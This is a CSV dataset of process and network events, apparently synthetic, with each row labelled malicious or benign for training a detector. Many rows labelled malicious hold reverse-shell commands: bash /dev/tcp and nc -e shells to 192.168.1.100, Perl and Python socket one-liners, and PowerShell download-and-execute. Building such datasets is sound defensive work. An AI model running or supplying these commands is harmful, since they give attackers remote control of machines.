timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-02-27 22:59:46.273608,f0e676e0,init,cmd.exe,38.75.57.13,204.144.38.237,1337,TCP,3149,1515,31.05,"python -c 'import socket,subprocess'",1
2025-03-02 08:48:45.690639,374fac6b,explorer.exe,explorer.exe,95.129.222.61,86.41.131.185,4444,TCP,825,793,37.0,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-10 07:41:45.058330,5def3297,explorer.exe,powershell,148.131.21.181,191.131.187.75,443,TCP,2339,2569,53.4,ping,0
2025-03-24 16:27:46.132052,1c1ca80c,systemd,bash,76.209.220.148,98.186.49.249,4444,TCP,2167,4388,40.13,"python -c 'import socket,subprocess'",1
2025-02-28 13:06:46.208715,4622e767,init,chrome.exe,159.65.148.245,158.88.193.114,8080,TCP,319,1931,42.26,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-14 13:16:45.506948,95fce0b2,init,powershell,128.211.166.116,205.35.127.125,1337,TCP,3722,911,7.1,dir,0
2025-03-15 14:53:45.519294,29bf7940,systemd,chrome.exe,19.16.120.95,215.53.208.100,22,TCP,227,3108,13.16,ping,0
2025-05-01 01:41:44.844824,891a8ae5,explorer.exe,svchost.exe,247.101.65.139,208.60.195.163,1337,UDP,1760,2008,26.95,ipconfig,0
2025-03-27 07:08:45.375867,be31c34d,svchost.exe,notepad.exe,151.47.250.218,149.154.92.73,3389,TCP,1897,1506,0.21,ls,0
2025-03-04 10:17:45.264380,e6de9863,init,chrome.exe,73.119.207.66,23.170.48.124,4444,UDP,1974,3315,22.51,ping,0
2025-03-20 05:49:45.702855,4dbc7f0f,systemd,python.exe,206.233.45.50,241.128.50.29,3389,UDP,171,3166,19.41,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-03 04:11:44.899781,3acc9705,explorer.exe,perl,69.117.140.14,15.122.209.162,3389,TCP,2258,3560,13.08,cd,0
2025-04-29 11:13:45.440655,cf966705,init,nc,197.139.238.21,113.205.56.161,22,TCP,4977,1076,14.7,ipconfig,0
2025-03-11 19:19:44.832296,ffbec561,explorer.exe,powershell,7.82.8.237,19.236.182.241,4444,TCP,3661,945,53.53,cd,0
2025-02-28 17:32:45.653436,774d39b2,explorer.exe,powershell,72.92.188.14,106.55.164.24,443,TCP,2842,1072,39.43,ipconfig,0
2025-04-11 22:51:45.829634,8a54f587,systemd,bash,55.126.20.182,216.90.46.201,4444,TCP,1286,2214,27.05,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-16 02:55:45.897791,2e0954a0,systemd,powershell,63.20.183.188,248.179.68.91,4444,UDP,3054,4390,10.88,"python -c 'import socket,subprocess'",1
2025-04-14 20:14:46.349910,47031805,explorer.exe,nc,57.105.35.32,122.97.54.49,8080,TCP,1061,534,43.67,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-09 14:10:45.867103,0ba0d369,init,cmd.exe,70.187.28.108,154.176.111.225,3389,TCP,2169,667,24.19,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-21 19:03:45.643943,8babb121,svchost.exe,perl,232.143.131.78,60.111.244.240,4444,UDP,184,4698,24.67,ipconfig,0
2025-04-26 06:15:45.143505,5be6ed85,init,svchost.exe,187.8.104.14,1.60.2.192,3389,UDP,4836,3928,13.51,dir,0
2025-04-26 04:57:46.283578,63b3a28d,explorer.exe,python.exe,27.57.97.12,163.143.246.33,22,UDP,1692,3965,9.36,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-31 00:36:45.345622,fe73bd7a,explorer.exe,explorer.exe,86.129.188.234,67.201.142.180,3389,TCP,2235,1416,37.56,ping,0
2025-03-15 09:01:45.005708,2e894ac7,systemd,cmd.exe,248.222.22.173,154.141.168.93,8080,UDP,4244,3938,12.74,dir,0
2025-02-22 09:32:45.827222,d79b0c0a,explorer.exe,python.exe,85.181.208.250,140.63.40.201,3389,UDP,863,4934,7.42,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-21 22:07:46.218604,ce8c8206,systemd,perl,26.229.190.153,212.207.246.134,443,UDP,2788,1620,12.66,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-20 17:43:45.996329,297626b9,systemd,notepad.exe,104.188.91.57,158.184.129.234,443,TCP,4573,232,5.25,"python -c 'import socket,subprocess'",1
2025-04-04 18:45:46.312510,9cfd4ed3,svchost.exe,notepad.exe,72.205.190.91,39.175.90.83,22,UDP,2545,3716,2.09,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-31 18:52:44.780550,4386e7d0,init,cmd.exe,192.195.169.118,169.21.86.142,22,TCP,137,4749,1.25,cd,0
2025-03-28 09:45:46.077313,14e17e89,explorer.exe,explorer.exe,161.251.147.168,49.222.227.76,22,TCP,4797,3750,19.22,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-27 04:16:45.776725,29b69ad0,explorer.exe,svchost.exe,231.202.137.9,190.203.209.11,22,UDP,1321,1530,44.3,"python -c 'import socket,subprocess'",1
2025-04-25 08:23:45.996920,06e29434,explorer.exe,nc,100.205.78.168,9.120.250.147,8080,TCP,4037,1689,47.7,"python -c 'import socket,subprocess'",1
2025-04-28 08:50:45.239200,eaf66c95,init,bash,238.47.1.64,225.204.41.123,443,TCP,3621,2015,15.21,ping,0
2025-04-25 12:32:44.933118,d022e6f9,svchost.exe,bash,82.245.180.146,33.5.233.216,4444,UDP,4490,1721,47.19,dir,0
2025-03-28 18:51:45.867571,6bd60c87,init,svchost.exe,174.247.213.8,154.126.163.49,3389,UDP,3053,1856,18.0,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-19 09:31:46.352100,e65090f5,explorer.exe,nc,224.9.12.89,105.59.13.31,4444,UDP,2576,4808,31.48,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-30 16:06:46.141599,3aee1369,systemd,cmd.exe,135.239.184.72,87.94.107.135,22,UDP,1608,2092,27.63,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-05 11:43:45.714281,570f1817,init,notepad.exe,183.175.36.40,92.18.89.239,8080,UDP,2640,2790,53.99,"python -c 'import socket,subprocess'",1
2025-03-22 19:39:44.934760,463628d6,explorer.exe,svchost.exe,17.55.90.4,219.115.177.112,4444,UDP,3750,1425,42.06,cd,0
2025-04-30 23:22:44.815952,66310f33,init,chrome.exe,3.189.192.76,208.170.239.169,443,UDP,1379,3113,12.98,ipconfig,0
2025-04-22 23:10:45.169812,c351cd85,svchost.exe,cmd.exe,210.245.6.63,160.222.114.242,443,TCP,2068,2327,10.46,dir,0
2025-04-02 00:33:45.867234,34ca5c67,svchost.exe,python.exe,72.208.174.84,186.45.246.212,22,UDP,2286,1016,37.42,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-18 05:03:45.873997,2fa6a251,explorer.exe,perl,121.129.97.74,214.78.61.169,4444,UDP,4632,4246,20.94,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-24 23:11:46.180017,7688a24e,explorer.exe,cmd.exe,43.46.181.68,165.147.160.102,443,TCP,2784,953,38.63,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-15 12:22:45.311856,136802f9,init,explorer.exe,53.18.199.189,67.238.148.65,3389,UDP,4334,3612,20.82,cd,0
2025-04-16 11:25:45.451493,b43801fe,init,bash,165.102.146.244,67.85.182.107,1337,UDP,2054,3891,5.85,dir,0
2025-03-22 19:03:45.438840,c8cec88f,svchost.exe,cmd.exe,94.150.204.163,136.26.26.136,8080,UDP,3342,872,10.67,cd,0
2025-03-03 11:11:45.455544,efe1737e,init,bash,221.209.122.244,101.36.144.106,1337,TCP,923,1264,10.63,ls,0
2025-02-27 20:02:45.754295,167b100f,explorer.exe,powershell,163.28.109.235,236.185.98.12,3389,TCP,1446,2414,46.13,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-19 20:56:45.270698,a32a7b48,explorer.exe,powershell,200.111.84.13,172.113.57.109,443,UDP,1000,2144,0.18,ls,0
2025-04-08 07:08:45.836409,72f23e38,explorer.exe,perl,227.46.42.117,44.105.176.147,8080,UDP,3729,4862,8.23,"python -c 'import socket,subprocess'",1
2025-04-08 11:23:45.678519,51b62c88,systemd,nc,6.36.129.47,43.242.249.8,443,UDP,2464,705,38.51,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-05 15:03:45.458237,83f3f3c7,svchost.exe,perl,13.196.72.93,94.47.85.123,8080,UDP,171,4011,51.38,ipconfig,0
2025-04-10 06:27:46.094611,e6291097,init,svchost.exe,213.82.163.148,165.145.84.18,443,UDP,4879,2003,33.87,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-24 12:46:45.740069,09468725,systemd,bash,73.124.225.217,164.116.174.23,22,TCP,4108,2625,17.17,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-09 18:33:44.777052,b5ef0577,init,bash,162.13.204.51,251.47.4.37,1337,TCP,1998,1376,23.87,dir,0
2025-04-14 03:36:45.094028,bfc1863c,explorer.exe,nc,190.57.181.28,199.48.193.203,1337,UDP,2341,4109,2.84,ping,0
2025-03-01 22:11:46.177800,a5c38337,init,nc,156.131.98.52,15.201.183.106,3389,UDP,1266,365,46.05,"python -c 'import socket,subprocess'",1
2025-02-27 10:59:45.637108,8535b334,init,cmd.exe,250.45.121.37,101.228.141.41,3389,TCP,1078,2774,50.18,ls,0
2025-04-28 13:57:44.882056,24ed21e0,explorer.exe,cmd.exe,69.94.93.205,184.31.190.233,1337,UDP,1716,2269,52.29,ls,0
2025-03-23 04:02:44.900415,75141e90,systemd,python.exe,47.68.29.62,167.242.8.39,1337,TCP,4369,3133,28.79,dir,0
2025-04-30 14:17:44.872272,b630cea7,systemd,python.exe,64.240.214.248,194.226.65.41,443,UDP,3662,372,48.83,cd,0
2025-04-20 21:21:46.300075,be76677d,systemd,svchost.exe,145.16.192.219,172.184.198.138,8080,UDP,1343,2385,41.6,"python -c 'import socket,subprocess'",1
2025-04-29 00:07:44.849235,14be608d,init,perl,21.75.58.81,41.158.79.159,443,TCP,4078,2327,6.47,ipconfig,0
2025-04-12 12:23:45.770173,d7d5b9fc,systemd,bash,117.226.137.68,189.134.185.22,8080,UDP,815,2738,22.43,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-04 20:15:45.314183,7110dc8d,init,powershell,198.190.182.85,187.141.127.17,4444,UDP,157,4873,50.28,dir,0
2025-04-30 13:33:45.583613,3c9c5259,svchost.exe,chrome.exe,196.139.55.121,159.251.116.246,1337,TCP,3005,3062,57.29,ls,0
2025-05-01 01:37:45.570430,2275d323,svchost.exe,perl,194.239.43.171,55.159.36.19,443,UDP,2957,1852,52.73,cd,0
2025-03-11 02:22:44.763065,1ff65422,init,perl,253.203.124.12,13.81.24.242,4444,TCP,2971,2363,57.53,ipconfig,0
2025-04-15 07:36:45.120585,23064dcd,svchost.exe,python.exe,146.151.56.132,162.161.199.172,8080,UDP,4638,4504,53.27,ls,0
2025-03-15 05:31:46.362056,0edd8e6f,svchost.exe,nc,120.24.91.161,220.190.67.124,3389,UDP,3492,3162,15.11,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-24 02:54:44.781929,f3de5df4,svchost.exe,python.exe,193.18.127.103,140.16.135.107,1337,UDP,1319,4540,49.39,ls,0
2025-03-09 16:17:44.885277,c3ba3b86,explorer.exe,notepad.exe,172.219.191.209,66.190.220.82,8080,UDP,3402,3286,4.7,ls,0
2025-03-15 20:16:45.091295,53c6cec8,explorer.exe,python.exe,198.146.208.104,83.162.41.20,1337,TCP,3951,4065,52.43,ipconfig,0
2025-03-05 15:07:46.131420,a74356ba,systemd,python.exe,30.76.107.212,25.230.23.160,3389,TCP,2973,2387,54.56,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-29 07:21:45.483230,66673402,svchost.exe,powershell,81.71.132.30,33.41.250.117,443,UDP,440,4535,3.67,cd,0
2025-03-10 18:46:45.219483,127c0b8e,systemd,chrome.exe,173.197.69.177,227.147.191.80,8080,TCP,4474,3182,22.0,dir,0
2025-04-11 18:54:45.998435,3ab91a84,explorer.exe,svchost.exe,115.14.120.119,185.31.200.54,4444,TCP,1884,3791,18.94,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-12 22:10:45.164398,dbfb5092,svchost.exe,nc,75.106.173.52,63.172.205.175,22,TCP,2449,4913,16.32,cd,0
2025-03-21 06:12:45.722650,e3780cd6,init,nc,37.141.151.150,227.100.103.96,22,TCP,3606,2345,28.27,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-11 23:30:45.448005,b7c5c8b4,explorer.exe,bash,68.203.88.219,150.249.197.71,8080,UDP,1727,384,45.87,dir,0
2025-03-15 10:07:45.240552,c806d0e2,explorer.exe,cmd.exe,154.158.127.10,118.7.80.197,4444,UDP,4626,1487,7.44,ping,0
2025-04-28 17:48:45.877977,d38da678,explorer.exe,perl,252.223.27.89,81.67.23.180,4444,TCP,715,4073,38.29,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-17 20:20:45.886218,69829ece,systemd,python.exe,57.76.137.230,57.121.12.170,3389,TCP,1077,3583,11.95,"python -c 'import socket,subprocess'",1
2025-03-12 02:35:45.702235,da984c64,explorer.exe,python.exe,239.251.84.105,101.188.166.162,4444,TCP,4861,2528,3.16,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-28 00:41:45.973158,a4175a31,systemd,notepad.exe,116.51.70.196,177.130.176.232,443,TCP,445,1372,20.85,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-21 15:12:46.323291,860e4fb8,systemd,svchost.exe,151.111.85.88,31.191.176.109,8080,UDP,811,3925,36.72,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-13 14:32:45.822461,2e10c12a,systemd,bash,184.243.78.176,89.65.15.13,22,UDP,3112,3320,26.37,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-22 14:13:46.025189,24988c1b,init,chrome.exe,245.248.181.3,250.90.128.45,443,UDP,933,3828,10.03,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-12 14:29:44.878002,c258954a,explorer.exe,notepad.exe,163.64.146.13,112.41.121.159,1337,UDP,4180,1532,53.51,cd,0
2025-03-21 17:43:46.358372,7eacc5f2,init,powershell,120.110.25.65,194.77.34.86,4444,UDP,2516,471,37.08,"python -c 'import socket,subprocess'",1
2025-03-27 23:04:45.023933,4376282a,explorer.exe,powershell,65.26.191.205,51.214.2.10,1337,TCP,1368,1394,1.4,ping,0
2025-04-21 02:43:45.504422,4e8666d8,systemd,explorer.exe,129.151.21.227,217.105.83.69,3389,UDP,2915,3174,19.4,ping,0
2025-04-25 14:40:45.040859,26f2d90d,svchost.exe,chrome.exe,60.152.40.229,229.92.35.112,1337,UDP,3036,2774,41.53,cd,0
2025-04-02 16:59:45.620421,65bad303,init,powershell,176.167.114.36,62.254.68.57,3389,TCP,3386,4540,12.12,ipconfig,0
2025-03-25 09:55:45.543001,48f5c6f1,systemd,explorer.exe,77.95.248.243,36.122.72.42,3389,UDP,4559,2800,52.7,dir,0
2025-03-09 04:09:45.335050,ced857bd,svchost.exe,python.exe,207.127.76.149,158.33.91.204,8080,TCP,2094,4081,19.51,dir,0
2025-03-12 05:54:44.899288,475926bf,systemd,chrome.exe,239.237.246.87,27.164.201.141,1337,TCP,3541,863,56.57,ls,0
2025-04-26 19:17:45.643256,4df81f3a,init,explorer.exe,207.152.124.48,121.131.89.125,1337,UDP,2223,3398,0.43,dir,0
2025-03-03 02:04:45.356993,23bd181c,explorer.exe,perl,41.46.233.228,52.27.58.158,1337,TCP,2991,999,1.49,cd,0
2025-04-04 15:44:45.667155,5cadafa9,svchost.exe,notepad.exe,50.80.29.99,169.13.115.53,1337,TCP,3552,1354,24.88,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-24 14:51:44.994384,00996d70,init,cmd.exe,44.197.151.127,94.204.182.140,1337,TCP,525,815,41.34,ping,0
2025-04-02 22:01:46.377821,855b37ee,init,svchost.exe,6.224.186.203,147.82.92.49,1337,UDP,1595,4743,4.91,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-02 18:56:45.298734,7df5b7a5,svchost.exe,cmd.exe,77.174.138.224,105.190.39.183,1337,UDP,93,718,37.99,cd,0
2025-03-19 03:33:45.509388,45edebc2,init,svchost.exe,33.109.250.237,107.76.50.117,1337,UDP,1215,3020,9.9,dir,0
2025-04-11 21:54:46.072564,730d85c3,svchost.exe,svchost.exe,19.130.162.231,30.32.207.176,4444,UDP,2918,4034,55.73,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-29 00:07:45.588044,9cd4f3f9,svchost.exe,chrome.exe,79.109.78.112,70.208.11.150,1337,UDP,527,3242,39.3,ls,0
2025-04-06 13:15:45.689410,ed6af867,explorer.exe,perl,158.35.145.174,186.252.236.175,1337,TCP,2628,4807,48.6,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-14 05:56:45.987525,0642a36c,explorer.exe,perl,9.133.210.172,216.153.35.27,443,UDP,1479,1397,4.84,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-15 01:00:45.731347,5a574411,init,nc,56.3.226.115,235.8.176.30,1337,TCP,488,3946,31.8,"python -c 'import socket,subprocess'",1
2025-02-27 15:45:45.563252,9a6b3ac2,svchost.exe,chrome.exe,163.16.237.218,99.34.36.116,4444,UDP,1784,3812,38.66,ipconfig,0
2025-03-02 06:05:46.138053,e9255d47,init,explorer.exe,209.136.65.163,226.232.199.110,443,TCP,2922,4640,22.51,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-08 07:18:45.714620,8ce88eaa,explorer.exe,chrome.exe,247.164.1.249,143.103.21.254,1337,UDP,1288,2645,26.89,"python -c 'import socket,subprocess'",1
2025-04-04 14:54:45.627715,b27d8cd1,init,svchost.exe,6.140.210.79,161.10.104.233,443,UDP,2745,2818,45.87,ipconfig,0
2025-04-17 06:58:44.856424,6734272a,systemd,bash,68.40.89.158,248.243.127.170,443,TCP,2793,2768,17.86,ls,0
2025-03-16 01:50:46.234323,edaff773,explorer.exe,bash,217.75.50.193,164.156.195.172,3389,UDP,928,239,52.76,"python -c 'import socket,subprocess'",1
2025-04-24 03:26:45.828716,75f0ec17,explorer.exe,svchost.exe,152.207.184.203,138.238.107.190,443,TCP,1792,4195,35.74,"python -c 'import socket,subprocess'",1
2025-03-22 17:10:44.893615,1bc30dfa,systemd,explorer.exe,201.171.39.197,38.141.200.223,1337,TCP,1875,1979,21.47,ls,0
2025-03-20 01:33:45.826467,d55c32ec,svchost.exe,notepad.exe,119.93.116.139,47.223.171.82,22,TCP,2716,1654,55.69,"python -c 'import socket,subprocess'",1
2025-03-26 17:33:44.730286,f25e5dd3,systemd,notepad.exe,214.1.194.6,251.77.119.173,1337,UDP,4407,3157,49.42,ls,0
2025-03-22 19:38:46.298777,ee0e671e,explorer.exe,notepad.exe,188.227.152.219,128.83.144.87,1337,TCP,2236,765,41.01,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-30 00:12:46.145614,cc5a81d3,init,cmd.exe,11.169.197.180,150.38.111.122,4444,UDP,79,1958,16.75,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-04 16:08:46.206216,ad20dfe2,init,svchost.exe,102.68.248.29,68.122.133.133,22,UDP,2486,2633,3.76,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-08 19:39:46.349806,0e2b534c,svchost.exe,explorer.exe,146.143.1.119,20.244.47.233,4444,UDP,2299,4362,43.08,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-11 09:54:45.418770,9832a816,init,perl,221.208.5.175,10.83.110.188,8080,TCP,3638,1778,4.81,dir,0
2025-04-01 06:47:46.047114,4b22126b,svchost.exe,chrome.exe,179.241.141.68,58.189.214.78,3389,UDP,4476,2840,48.57,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-29 14:13:44.991389,1095db3d,systemd,svchost.exe,141.28.57.249,25.39.92.75,8080,TCP,4779,4802,30.03,ping,0
2025-03-13 02:50:44.717755,4bf4e22b,svchost.exe,bash,16.53.214.108,100.232.198.150,1337,TCP,4766,3166,28.67,ping,0
2025-03-31 03:06:45.602920,3ad79954,systemd,python.exe,220.219.179.207,114.143.61.38,3389,TCP,2239,4357,55.8,dir,0
2025-04-08 15:14:45.090170,e8c06567,svchost.exe,python.exe,236.45.149.238,21.180.215.137,3389,TCP,3006,4329,3.2,ipconfig,0
2025-04-04 21:54:44.888831,bd8ce10b,svchost.exe,cmd.exe,27.38.2.143,28.140.1.50,8080,TCP,4154,1310,21.4,ls,0
2025-03-27 14:17:45.180006,835b3736,systemd,nc,204.225.251.251,26.215.66.235,22,UDP,1474,1248,54.47,ipconfig,0
2025-04-15 18:46:45.965933,86af40a7,svchost.exe,notepad.exe,248.93.172.210,205.92.25.195,22,TCP,4811,1355,13.69,"python -c 'import socket,subprocess'",1
2025-04-15 22:15:45.810848,172bfd96,init,nc,196.50.65.97,136.163.105.189,22,UDP,4180,3636,36.53,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-23 06:59:46.002897,c06f5d00,svchost.exe,svchost.exe,212.134.136.28,93.38.31.150,1337,UDP,1929,2767,48.34,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-27 00:24:45.117373,a19eab81,systemd,notepad.exe,82.124.12.185,29.149.27.108,4444,TCP,4665,1173,35.97,dir,0
2025-04-20 22:32:46.348032,6087a54d,explorer.exe,python.exe,247.162.72.37,66.16.194.47,1337,UDP,4108,2472,3.31,"python -c 'import socket,subprocess'",1
2025-03-01 02:19:45.855715,50e576fe,systemd,svchost.exe,142.153.90.252,76.91.189.165,443,UDP,1234,2162,31.79,"python -c 'import socket,subprocess'",1
2025-03-20 15:22:45.679211,7d536b8c,svchost.exe,nc,110.47.207.167,147.92.78.21,1337,UDP,380,3281,43.49,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-25 18:30:44.824579,1da6dd0f,init,cmd.exe,76.7.158.43,55.63.199.220,4444,TCP,3801,2540,51.1,ping,0
2025-02-28 04:36:45.608968,8ba545b2,svchost.exe,perl,62.56.226.47,69.204.149.50,3389,TCP,2890,561,28.23,dir,0
2025-04-17 03:43:45.906235,8be064c7,init,powershell,157.103.177.44,35.253.172.106,443,TCP,1799,4974,39.68,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-24 17:17:45.954316,651644f7,init,cmd.exe,252.44.179.81,187.167.12.50,22,UDP,2356,2521,50.96,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-12 11:20:45.677293,ccadc001,svchost.exe,powershell,93.118.103.170,62.209.237.92,8080,TCP,3328,2537,7.47,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-23 12:04:45.822399,49567114,svchost.exe,svchost.exe,68.216.100.42,38.23.100.90,1337,UDP,2588,2709,16.35,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-09 19:43:45.398555,97fb90f3,svchost.exe,svchost.exe,26.225.89.80,14.239.197.221,8080,TCP,2855,3372,19.05,ping,0
2025-03-20 01:41:44.965673,fa472280,init,chrome.exe,67.235.77.101,218.157.135.71,4444,TCP,4980,552,22.84,dir,0
2025-03-28 03:11:46.317155,7fa7b5c3,svchost.exe,notepad.exe,135.230.185.74,79.126.63.176,1337,TCP,1455,1415,40.51,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-24 18:57:45.825091,86eb5d86,svchost.exe,chrome.exe,168.197.209.85,12.137.121.144,1337,TCP,2313,4690,6.48,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-28 15:59:44.834298,8ca5dc43,explorer.exe,cmd.exe,161.18.138.183,186.38.62.202,8080,TCP,415,668,53.33,ipconfig,0
2025-02-27 02:01:46.258567,33ca2012,init,python.exe,46.26.11.52,163.222.101.230,8080,TCP,290,3770,27.85,"python -c 'import socket,subprocess'",1
2025-04-18 12:15:46.117320,b4728dfb,svchost.exe,chrome.exe,1.141.132.87,148.50.129.62,443,UDP,361,658,48.81,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-02 18:40:45.256429,dba0d295,systemd,perl,177.102.23.22,104.200.141.207,4444,UDP,4239,400,18.67,ping,0
2025-04-24 18:25:46.339076,3d94b96e,init,powershell,61.30.37.112,156.196.69.67,8080,TCP,3390,258,31.06,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-16 02:18:45.419155,7c7d0940,systemd,perl,105.245.118.245,246.192.134.211,443,TCP,121,4951,12.96,ls,0
2025-03-16 14:59:46.208606,58e4ab24,explorer.exe,chrome.exe,245.195.131.191,35.89.84.249,8080,UDP,4056,2048,13.44,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-21 22:16:45.649570,4389d369,init,bash,79.195.180.130,77.83.23.197,1337,TCP,1111,3886,51.48,cd,0
2025-04-20 16:41:45.722330,5e377ab2,init,cmd.exe,58.65.109.203,230.151.83.150,1337,TCP,4365,1139,11.91,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-21 15:29:44.871666,c6cdc91e,svchost.exe,notepad.exe,87.35.20.67,162.196.189.22,1337,TCP,53,1446,10.01,dir,0
2025-02-21 14:25:45.598877,f05e2d77,systemd,bash,24.106.120.20,207.169.108.15,4444,TCP,1470,1931,32.28,cd,0
2025-04-19 20:55:45.693895,9889e490,systemd,powershell,47.137.124.14,189.25.94.245,8080,UDP,1796,1576,56.94,"python -c 'import socket,subprocess'",1
2025-03-28 13:01:45.342956,c6f18c48,explorer.exe,perl,20.140.166.199,95.136.227.125,8080,UDP,1854,3404,3.05,dir,0
2025-03-10 21:32:46.182721,d6f3b23e,systemd,svchost.exe,19.169.242.223,200.199.140.1,4444,UDP,884,1286,45.54,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-28 18:43:44.810709,478d238c,svchost.exe,python.exe,97.242.148.156,153.65.73.149,1337,UDP,3363,3588,26.55,dir,0
2025-03-28 12:20:44.888934,d904754a,systemd,bash,108.144.75.243,144.240.14.56,1337,TCP,3550,1658,24.08,ipconfig,0
2025-03-20 02:51:44.996672,6483a438,systemd,notepad.exe,182.56.164.198,211.187.143.149,22,UDP,4146,4069,45.31,ping,0
2025-04-22 03:59:45.138117,f907b098,svchost.exe,bash,223.146.101.51,248.51.1.47,4444,TCP,2622,4643,15.59,ping,0
2025-03-16 11:52:46.409504,0e839fa6,init,python.exe,100.28.193.23,65.19.252.100,3389,UDP,1934,3544,22.56,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-23 13:35:45.028415,84fc9308,systemd,bash,95.154.174.229,164.249.11.47,3389,TCP,3925,3776,41.93,cd,0
2025-04-17 04:28:45.726961,88e8e067,explorer.exe,powershell,78.50.3.134,207.251.176.40,22,UDP,3586,428,37.55,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-18 12:15:46.092875,1e3a8d6e,systemd,nc,30.29.7.182,210.32.124.116,1337,UDP,4693,4063,16.89,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-13 15:36:45.177449,89606016,explorer.exe,python.exe,151.129.175.65,11.191.180.124,22,UDP,2735,1456,17.8,cd,0
2025-02-26 21:19:45.393548,a538a3c4,svchost.exe,python.exe,118.147.111.241,42.129.70.89,4444,UDP,3359,2753,41.76,ipconfig,0
